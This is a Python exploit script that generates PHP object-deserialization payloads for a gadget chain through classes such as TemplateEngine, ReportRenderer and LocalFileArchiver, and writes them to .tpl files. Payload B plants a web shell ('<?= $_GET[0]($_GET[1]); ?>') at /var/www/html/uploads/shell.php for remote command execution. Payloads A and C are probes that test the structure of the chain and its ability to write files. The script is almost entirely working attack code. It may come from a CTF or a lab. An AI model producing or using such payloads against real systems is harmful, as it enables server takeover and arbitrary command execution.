#!/usr/bin/env python3
import re, html

def s(v):  # php serialize string
    v = v.encode().decode('unicode_escape').encode('latin1').decode('latin1')
    return 's:%d:"%s";' % (len(v.encode('latin1')), v)

def obj(cls, props):
    out = ''
    for k, v in props.items():
        out += s(k) + v
    return 'O:%d:"%s":%d:{%s}' % (len(cls), cls, len(props), out)

# ---- Payload A: structure test, plain ----
tm_a = obj('TemplateMetadata', {
    'name': s('probe123'),
    'version': s('1.0'),
    'renderer': 'N;',
})
eng_a = obj('TemplateEngine', {'parser': tm_a, 'cacheDriver': 'N;'})

# ---- Payload B: full chain -> write shell.php, name contains PHP ----
name_php = '<?= $_GET[0]($_GET[1]); ?>'
arch = obj('LocalFileArchiver', {
    'storagePath': s('/var/www/html/uploads/shell.php'),
    'compressor': 'N;',
})
pp = obj('ExportPostProcessor', {'archiver': arch, 'nextProcessor': 'N;'})
rr = obj('ReportRenderer', {'outputFormat': s('html'), 'postProcessor': pp})
tm_b = obj('TemplateMetadata', {'name': s(name_php), 'version': s('1.0'), 'renderer': rr})
eng_b = obj('TemplateEngine', {'parser': tm_b, 'cacheDriver': 'N;'})

# ---- Payload C: chain, plain name -> write probe.txt ----
arch_c = obj('LocalFileArchiver', {
    'storagePath': s('/var/www/html/uploads/probe.txt'),
    'compressor': 'N;',
})
pp_c = obj('ExportPostProcessor', {'archiver': arch_c, 'nextProcessor': 'N;'})
rr_c = obj('ReportRenderer', {'outputFormat': s('html'), 'postProcessor': pp_c})
tm_c = obj('TemplateMetadata', {'name': s('chainprobe'), 'version': s('1.0'), 'renderer': rr_c})
eng_c = obj('TemplateEngine', {'parser': tm_c, 'cacheDriver': 'N;'})

open('payA.tpl', 'w').write(eng_a)
open('payB.tpl', 'w').write(eng_b)
open('payC.tpl', 'w').write(eng_c)
print("A:", eng_a)
print("B:", eng_b)
print("C:", eng_c)
print("B has <?= ?", '<?=' in eng_b)
